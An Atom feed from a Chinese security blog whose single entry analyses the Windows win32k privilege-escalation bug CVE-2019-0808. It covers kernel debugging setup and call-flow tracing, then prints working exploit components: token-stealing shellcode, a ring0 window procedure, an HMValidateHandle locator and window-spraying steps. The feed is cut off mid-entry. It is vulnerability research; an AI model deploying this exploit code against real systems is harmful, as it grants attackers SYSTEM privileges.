<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大大黄的博客</title>
  
  <subtitle>lahonja&#39;s Blog</subtitle>
  <link href="http://lahonja.me/atom.xml" rel="self"/>
  
  <link href="http://lahonja.me/"/>
  <updated>2019-10-11T03:02:31.369Z</updated>
  <id>http://lahonja.me/</id>
  
  <author>
    <name>LAHONJA</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-0808详细分析</title>
    <link href="http://lahonja.me/2019/10/10/CVE-2019-0808%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>http://lahonja.me/2019/10/10/CVE-2019-0808%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2019-10-10T00:51:33.000Z</published>
    <updated>2019-10-11T03:02:31.369Z</updated>
    
    <content type="html"><![CDATA[<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h4><p>本次调试环境为Win7 x86 sp1，使用windbg需要安装SDK。另外要注意的是，新安装的系统的win32k.sys版本为6.1.7601.17514，本文分析的win32k.sys版本为6.1.7601.23591。<br>下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=8279" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=8279</a></p><blockquote><p><a href="cve-2019-0808.rar">点击下载DLL及pdb、IDA注释文件</a></p></blockquote><img src="/2019/10/10/CVE-2019-0808详细分析/40.png"><p>win8/win10可以在应用商店安装windbg preview，并配合 VirtualKD 进行双机调试 :)  <a href="https://bbs.pediy.com/thread-247019.htm" target="_blank" rel="noopener">传送门</a><br>VirtualKD 中调试器路径选择自定义，地址为：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\j</span>ack<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indowsApps<span class="symbol">\W</span>inDbgX.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</span><br></pre></td></tr></table></figure><p>注意不是windbg preview安装后的EXE目录：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">Program</span> <span class="selector-tag">Files</span>\<span class="selector-tag">WindowsApps</span>\<span class="selector-tag">Microsoft</span><span class="selector-class">.WinDbg_1</span><span class="selector-class">.1910</span><span class="selector-class">.3003</span><span class="selector-class">.0_neutral__8wekyb3d8bbwe</span>\<span class="selector-tag">DbgX</span><span class="selector-class">.Shell</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure><p>另外 IDA 7.0 如果不自动下载PDB符号，需要将cfg/pdb.cfg中的相关注释去掉，并建立相应文件夹，另外需要vc runtime 2010运行库（是个坑）。</p><h4 id="开启内核调试"><a href="#开启内核调试" class="headerlink" title="开启内核调试"></a>开启内核调试</h4><p>首先在系统变量中设置符号表服务器系统变量：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_NT_SYMBOL_PATH=SRV*C:\WINDOWS\Symbols*http://msdl.microsoft.com/download/symbols</span><br></pre></td></tr></table></figure><p>进入kernel-mode debugging (kd&gt; or lkd&gt;)调试模式，首先命令行运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br></pre></td></tr></table></figure><p>重启，再打开windbg，即可通过快捷键 Ctrl+K ，或者以下菜单路径，进入内核调试模块：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinDbg <span class="keyword">File</span>&gt;Kernel Debugging&gt;<span class="keyword">Local</span>&gt;Ok</span><br></pre></td></tr></table></figure><a id="more"></a><img src="/2019/10/10/CVE-2019-0808详细分析/1.png"><p>远程调试：<br>被调试机： .server tcp:port=5005<br>调试者机： tcp:Port=5005,Server=192.168.227.130</p><h4 id="加载指定模块的符号"><a href="#加载指定模块的符号" class="headerlink" title="加载指定模块的符号"></a>加载指定模块的符号</h4><p>lm 查看加载模块（win32k必须加载）<br>.reload 重新加载模块<br>!lmi win32k 查看win32k模块导入信息，pdb是否加载</p><img src="/2019/10/10/CVE-2019-0808详细分析/2.png"><p>ld win32k 或者 .reload /f win32k.sys 手工加载win32k模块的符号</p><p>x win32k!<em>DragOver</em> 以通配符搜索win32k模块中的符号</p><img src="/2019/10/10/CVE-2019-0808详细分析/3.png"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt win32k!tag*Menu*</span><br><span class="line">          win32k!tagMENUSTATE</span><br><span class="line">          win32k!tagMENU</span><br><span class="line">          win32k!tagPOPUPMENU</span><br><span class="line">          win32k!tagMENULIST</span><br><span class="line">          win32k!tagUAHMENUPOPUPMETRICS</span><br><span class="line">          win32k!tagUAHMENUITEMMETRICS</span><br></pre></td></tr></table></figure><h4 id="相关参考文档"><a href="#相关参考文档" class="headerlink" title="相关参考文档"></a>相关参考文档</h4><p>网上能够找到的较好的文章：<br><a href="https://www.cnblogs.com/goabout2/p/11255693.html" target="_blank" rel="noopener">关于EXP中构造条件的算法分析</a><br><a href="https://blog.exodusintel.com/2019/05/17/windows-within-windows/" target="_blank" rel="noopener">原作者exodusintel的分析</a><br><a href="https://www.4hou.com/vulnerable/18132.html" target="_blank" rel="noopener">原作者分析的翻译</a></p><p>研究人员通过补丁对比，发现<strong>Win32k!xxxMNSetGapState</strong>函数，可以在内核态下达到任意地址读写：</p><img src="/2019/10/10/CVE-2019-0808详细分析/18.png"><h3 id="反向流程分析"><a href="#反向流程分析" class="headerlink" title="反向流程分析"></a>反向流程分析</h3><h4 id="xxxMNSetGapState"><a href="#xxxMNSetGapState" class="headerlink" title="xxxMNSetGapState"></a>xxxMNSetGapState</h4><img src="/2019/10/10/CVE-2019-0808详细分析/19.png"><h4 id="xxxMNUpdateDraggingInfo"><a href="#xxxMNUpdateDraggingInfo" class="headerlink" title="xxxMNUpdateDraggingInfo"></a>xxxMNUpdateDraggingInfo</h4><img src="/2019/10/10/CVE-2019-0808详细分析/17.png"><h4 id="xxxMNMouseMove"><a href="#xxxMNMouseMove" class="headerlink" title="xxxMNMouseMove"></a>xxxMNMouseMove</h4><img src="/2019/10/10/CVE-2019-0808详细分析/12.png"><h4 id="xxxHandleMenuMessages"><a href="#xxxHandleMenuMessages" class="headerlink" title="xxxHandleMenuMessages"></a>xxxHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/13.png"><h4 id="xxxCallHandleMenuMessages"><a href="#xxxCallHandleMenuMessages" class="headerlink" title="xxxCallHandleMenuMessages"></a>xxxCallHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/14.png"><h4 id="xxxMNDragOver"><a href="#xxxMNDragOver" class="headerlink" title="xxxMNDragOver"></a>xxxMNDragOver</h4><img src="/2019/10/10/CVE-2019-0808详细分析/15.png"><h4 id="NtUserMNDragOver"><a href="#NtUserMNDragOver" class="headerlink" title="NtUserMNDragOver"></a>NtUserMNDragOver</h4><h3 id="正向流程分析"><a href="#正向流程分析" class="headerlink" title="正向流程分析"></a>正向流程分析</h3><h4 id="NtUserMNDragOver-1"><a href="#NtUserMNDragOver-1" class="headerlink" title="NtUserMNDragOver"></a>NtUserMNDragOver</h4><p>这里主要分析从用户态的 User32!NtUserMNDragOver 调用到内核态的 Win32k!NtUserMNDragOver ，并由 Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver。<br>整个漏洞的利用链是从 <strong>User32!NtUserMNDragOver</strong> 开始的：</p><img src="/2019/10/10/CVE-2019-0808详细分析/4.png"><p>可以看到 NtUserMNDragOver 在这里调用了[7FFE0300]中存放的地址77C270B0：</p><img src="/2019/10/10/CVE-2019-0808详细分析/5.png"><p>接下来，看看调用的77C270B0位置处的函数到底是什么：</p><img src="/2019/10/10/CVE-2019-0808详细分析/6.png"><p>可以看到，77C270B0位置正是 <strong>ntdll!KiFastSystemCall</strong> 的地址，从ntdll.dll的导出函数也可以看到：</p><img src="/2019/10/10/CVE-2019-0808详细分析/7.png"><p>在NtUserMNDragOver中， <strong>call ntdll!KiFastSystemCall</strong> 之前，将0x11ED放入了eax，而0x11ED就是进入KiFastSystemCall后，内核调用的系统服务函数号，Windows 7 x86/Windows 7 SP1 x86 系统中0x11ED系统服务函数号对应的函数就是NtUserMNDragOver：</p><img src="/2019/10/10/CVE-2019-0808详细分析/8.png"><p>Win32k!NtUserMNDragOver 调用 Win32k!xxxMNDragOver：</p><img src="/2019/10/10/CVE-2019-0808详细分析/16.png"><h4 id="xxxMNDragOver-1"><a href="#xxxMNDragOver-1" class="headerlink" title="xxxMNDragOver"></a>xxxMNDragOver</h4><img src="/2019/10/10/CVE-2019-0808详细分析/20.png"><h4 id="xxxCallHandleMenuMessages-1"><a href="#xxxCallHandleMenuMessages-1" class="headerlink" title="xxxCallHandleMenuMessages"></a>xxxCallHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/21.png"><h4 id="xxxHandleMenuMessages-1"><a href="#xxxHandleMenuMessages-1" class="headerlink" title="xxxHandleMenuMessages"></a>xxxHandleMenuMessages</h4><img src="/2019/10/10/CVE-2019-0808详细分析/22.png"><h4 id="xxxMNMouseMove-1"><a href="#xxxMNMouseMove-1" class="headerlink" title="xxxMNMouseMove"></a>xxxMNMouseMove</h4><img src="/2019/10/10/CVE-2019-0808详细分析/23.png"><h4 id="xxxMNUpdateDraggingInfo-1"><a href="#xxxMNUpdateDraggingInfo-1" class="headerlink" title="xxxMNUpdateDraggingInfo"></a>xxxMNUpdateDraggingInfo</h4><img src="/2019/10/10/CVE-2019-0808详细分析/24.png"><h4 id="xxxMNSetGapState-1"><a href="#xxxMNSetGapState-1" class="headerlink" title="xxxMNSetGapState"></a>xxxMNSetGapState</h4><img src="/2019/10/10/CVE-2019-0808详细分析/25.png"><h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><h4 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h4><p>在内核中，进程是靠EPROCESS来识别的。每个进程都有一个 EPROCESS 结构，里面保存着进程的各种信息，和相关结构的指针。<br>EPROCESS结构体定义如下，其中有一项为<strong>EX_FAST_REF Token</strong>，偏移为0xf8（后面的Shellcode会用到这个偏移）。</p><img src="/2019/10/10/CVE-2019-0808详细分析/30.png"><p>EPROCESS 结构位于系统地址空间，所以访问这个结构需要有ring0的权限。如下Shellcode的作用，就是遍历系统中的进程，找到进程ID为4的进程，将其进程token复制给当前进程。当然这段shellcode也需要在ring0下运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__declspec(noinline) <span class="function"><span class="keyword">int</span> <span class="title">Shellcode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// https://www.abatchy.com/2018/01/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1.</span></span><br><span class="line"><span class="comment">// 1. _KPRCB中找到对应当前线程的 _KTHREAD结构体.</span></span><br><span class="line"><span class="comment">// 2. _KTHREAD中找到对应当前进程的_EPROCESS结构体,</span></span><br><span class="line"><span class="comment">// 3. 在_EPROCESS查找带有PID = 4的进程（uniqueProcessId = 4）; 该"System"进程SID == NT AUTHORITY\SYSTEM SID</span></span><br><span class="line"><span class="comment">// 4. 检索那进程的令牌地址</span></span><br><span class="line"><span class="comment">// 5. 对应我们想要提权的进程中找到_EPROCESS.</span></span><br><span class="line"><span class="comment">// 6. 用System进程的令牌替换进程的Token.</span></span><br><span class="line"></span><br><span class="line">__asm &#123;</span><br><span class="line">xor eax, eax <span class="comment">// Set EAX to 0.</span></span><br><span class="line">mov eax, DWORD PTR fs : [eax + <span class="number">0x124</span>] <span class="comment">// Get nt!_KPCR.PcrbData.</span></span><br><span class="line"> <span class="comment">// _KTHREAD is located at FS:[0x124]</span></span><br><span class="line">    mov eax, [eax + <span class="number">0x50</span>] <span class="comment">// Get nt!_KTHREAD.ApcState.Process</span></span><br><span class="line">mov ecx, eax <span class="comment">// Copy current process _EPROCESS structure</span></span><br><span class="line">xor edx, edx <span class="comment">// Set EDX to 0.</span></span><br><span class="line">mov DWORD PTR[ecx + <span class="number">0x124</span>], edx <span class="comment">// Set the JOB pointer in the _EPROCESS structure to NULL.</span></span><br><span class="line">mov edx, <span class="number">0x4</span> <span class="comment">// Windows 7 SP1 SYSTEM process PID = 0x4</span></span><br><span class="line">SearchSystemPID:</span><br><span class="line">    mov eax, [eax + <span class="number">0B</span>8h] <span class="comment">// Get nt!_EPROCESS.ActiveProcessLinks.Flink</span></span><br><span class="line">sub eax, <span class="number">0B</span>8h</span><br><span class="line">cmp[eax + <span class="number">0B</span>4h], edx <span class="comment">// Get nt!_EPROCESS.UniqueProcessId</span></span><br><span class="line">jne SearchSystemPID  <span class="comment">// 遍历所有的 _EPROCESS 结构体，找到进程ID为4的system进程</span></span><br><span class="line">mov edx, [eax + <span class="number">0xF8</span>] <span class="comment">// Get SYSTEM process nt!_EPROCESS.Token</span></span><br><span class="line">mov[ecx + <span class="number">0xF8</span>], edx <span class="comment">// Assign SYSTEM process token.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="进入ring0"><a href="#进入ring0" class="headerlink" title="进入ring0"></a>进入ring0</h4><blockquote><p>参考：<a href="https://labs.f-secure.com/archive/mwr-labs-pwn2own-2013-write-up-kernel-exploit/" target="_blank" rel="noopener">bServerSideWindowProc详情传送门</a></p></blockquote><p>通过上面的Shellcode，可以修改任意进程的Token，从而达到提权，但是Shellcode也是需要在ring0下才能正常运行的，所以要找到一个在ring0下运行它的方法。<br>这里要用到的是通过WNDCLASSEXW创建的窗口，都可以指定一个窗口消息处理函数lpfnWndProc，当然这是正常的使用方法，但是每个WNDCLASSEXW实例，在内核中都有对应的tagWND结构， 这个结构中有一个重要的标识： bServerSideWindowProc 。如果bServerSideWindowProc为1，则系统调用窗口消息处理函数lpfnWndProc时，将会以内核权限执行lpfnWndProc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt win32k!tagWND</span><br><span class="line">   +<span class="number">0x000</span> head             : _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> state            : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> bHasMeun         : Pos <span class="number">0</span>, <span class="number">1</span> Bit   ...</span><br><span class="line">   +<span class="number">0x014</span> bServerSideWindowProc : Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bAnsiWindowProc  : Pos <span class="number">19</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bBeingActivated  : Pos <span class="number">20</span>, <span class="number">1</span> Bit</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x014</span> bMaximizesToMonitor : Pos <span class="number">30</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> bDestroyed       : Pos <span class="number">31</span>, <span class="number">1</span> Bit</span><br><span class="line">   ...</span><br><span class="line">   +<span class="number">0x060</span> lpfnWndProc      : Ptr32     <span class="keyword">long</span></span><br></pre></td></tr></table></figure><p><strong>当然要想修改这个标识，也需要在内核态下才能修改，这里就利用了最开始提到的Win32k!xxxMNSetGapState。（然而并不是那么简单）</strong></p><h4 id="lpfnWndProc中执行Shellcode"><a href="#lpfnWndProc中执行Shellcode" class="headerlink" title="lpfnWndProc中执行Shellcode"></a>lpfnWndProc中执行Shellcode</h4><p>这里主要是通过汇编来判断寄存器中cs（代码段寄存器的值），一般当cs的值为0x1b时，代码是在用户态下运行，否则是在内核态下运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">sprayWndProc</span><span class="params">(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (uMsg == WM_ENTERIDLE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] sprayWndProc WM_ENTERIDLE message\n"</span>);</span><br><span class="line">WORD um = <span class="number">0</span>;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Grab the value of the CS register and</span></span><br><span class="line"><span class="comment">// save it into the variable UM.</span></span><br><span class="line">mov ax, cs</span><br><span class="line">mov um, ax</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If UM is 0x1B, this function is executing in usermode</span></span><br><span class="line"><span class="comment">// code and something went wrong. Therefore output a message that</span></span><br><span class="line"><span class="comment">// the exploit didn't succeed and bail.</span></span><br><span class="line"><span class="keyword">if</span> (um == <span class="number">0x1b</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// USER MODE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Exploit didn't succeed, entered sprayWndProc with user mode privileges.\r\n"</span>);</span><br><span class="line">ExitProcess(<span class="number">-1</span>); <span class="comment">// Bail as if this code is hit either the target isn't vulnerable or something is wrong with the exploit.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">success = TRUE; <span class="comment">// Set the success flag to indicate the sprayWndProc() window procedure is running as SYSTEM.</span></span><br><span class="line">Shellcode(); <span class="comment">// Call the Shellcode() function to perform the token stealing and</span></span><br><span class="line"> <span class="comment">// to remove the Job object on the Chrome render process.</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用HMValidateHandle获取tagWND"><a href="#调用HMValidateHandle获取tagWND" class="headerlink" title="调用HMValidateHandle获取tagWND"></a>调用HMValidateHandle获取tagWND</h4><p>Windows的HMValidateHandle函数，可以获取指定窗口句柄的THRDESKHEAD结构，而此结构的pSelf成员就是tagWND的内存地址。但是HMValidateHandle函数并未在dll中导出，所以不能直接调用，需要通过在user32.dll中特定位置搜索函数调用的标识来找到这个函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">findHMValidateHandleAddress</span><span class="params">(HMODULE hUser32)</span> </span>&#123;</span><br><span class="line"><span class="comment">// HMValidateHandle() 函数未在user32.dll中导出，</span></span><br><span class="line"><span class="comment">// 在 IsMenu 函数中有对 HMValidateHandle 的调用，调用的汇编指令 call 对应的机器码为 \xEB</span></span><br><span class="line">BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, <span class="string">"IsMenu"</span>);</span><br><span class="line"><span class="keyword">if</span> (pIsMenuFunction == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Failed to find the address of IsMenu within user32.dll.\r\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] pIsMenuFunction: 0x%08X\r\n"</span>, (DWORD)pIsMenuFunction);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历内存</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offsetInIsMenuFunction = <span class="number">0</span>;</span><br><span class="line">BOOL foundHMValidateHandleAddress = FALSE;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++) &#123;</span><br><span class="line">BYTE* pCurrentByte = pIsMenuFunction + i;</span><br><span class="line"><span class="keyword">if</span> (*pCurrentByte == <span class="number">0xE8</span>) &#123;</span><br><span class="line">offsetInIsMenuFunction = i + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (offsetInIsMenuFunction == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't find offset to HMValidateHandle within IsMenu.\r\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] hUser32: 0x%08X\r\n"</span>, (DWORD)hUser32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> relativeAddressBeingCalledInIsMenu = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(pIsMenuFunction + offsetInIsMenuFunction);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] relativeAddressBeingCalledInIsMenu: 0x%08X\r\n"</span>, relativeAddressBeingCalledInIsMenu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> addressOfIsMenuFromStartOfUser32 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)pIsMenuFunction - (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] addressOfIsMenuFromStartOfUser32: 0x%08X\r\n"</span>, addressOfIsMenuFromStartOfUser32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset = addressOfIsMenuFromStartOfUser32 + relativeAddressBeingCalledInIsMenu;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] offset: 0x%08X\r\n"</span>, offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳过11个字节的NOP指令</span></span><br><span class="line"><span class="comment">// 注意： Windows 10 以上 没有 NOP 指令，不需要 + 11</span></span><br><span class="line">pHmValidateHandle = (lHMValidateHandle)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)hUser32 + offset + <span class="number">11</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] pHmValidateHandle: 0x%08X\r\n"</span>, (DWORD)pHmValidateHandle);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="窗口喷射"><a href="#窗口喷射" class="headerlink" title="窗口喷射"></a>窗口喷射</h4><blockquote><p>找到两个内核中tagWND靠的比较近的，通过修改上一个窗口的cbWndExtra字段，从而前一个窗口的附加数据可以覆盖后一个窗口的bServerSideWindowProc标识。</p></blockquote><p>上面提到了，修改了这个标识，就可以让窗口的消息处理函数，以内核态进行运行。但是我们回过头去看xxxMNSetGapState，这里对任意地址的写入，只能是|=0x40000000。所以通过这里来精准的修改bServerSideWindowProc标识为1，是个不太现实的方法。所以这里又引入了窗口喷射，通过xxxMNSetGapState修改前一个窗口的cbWndExtra为0x40000000，从而控制后面窗口的数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a4 )</span><br><span class="line">&#123;</span><br><span class="line">    v6[<span class="number">1</span>] |= <span class="number">0x40000000</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span>) |= <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WNDCLASSEXA.cbWndExtra 是窗口的附加数据大小，正常使用是注册窗口时指定，是系统自动分配的内存。在WNDCLASSEXA注册实例的内核对象tagWND末尾，偏移为0xB0。</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt win32k!tagWND</span><br><span class="line">win32k!tagWND</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">head             :</span> _THRDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">state            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasMeun         :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasVerticalScrollbar :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bHasCreatestructName :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">bServerSideWindowProc :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit   <span class="comment">// 通过后一个窗口的SetWindowTextA修改strName指向的这个标识</span></span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x074</span> <span class="string">spmenuSys        :</span> Ptr32 tagMENU</span><br><span class="line">   +<span class="number">0x078</span> <span class="string">spmenu           :</span> Ptr32 tagMENU</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x084</span> <span class="string">strName          :</span> _LARGE_UNICODE_STRING <span class="comment">//通过前一个窗口SetWindowLongA，覆盖第二个窗口的strName指针</span></span><br><span class="line">   +<span class="number">0x090</span> <span class="string">cbwndExtra       :</span> Int4B                 <span class="comment">//通过xxxMNSetGapState修改它为0x40000000</span></span><br><span class="line">   +<span class="number">0x094</span> <span class="string">spwndLastActive  :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x098</span> <span class="string">hImc             :</span> Ptr32 HIMC__</span><br><span class="line">   +<span class="number">0x09c</span> <span class="string">dwUserData       :</span> Uint4B</span><br><span class="line">...</span><br><span class="line">   +<span class="number">0x0a8</span> <span class="string">spwndClipboardListenerNext :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x0ac</span> <span class="string">ExStyle2         :</span> Uint4B</span><br></pre></td></tr></table></figure><p>hPrimaryWindow窗口的tagWND对象，cbWndExtra覆盖前后WNDCLASSEXA结构的对比：</p><img src="/2019/10/10/CVE-2019-0808详细分析/31.png"><img 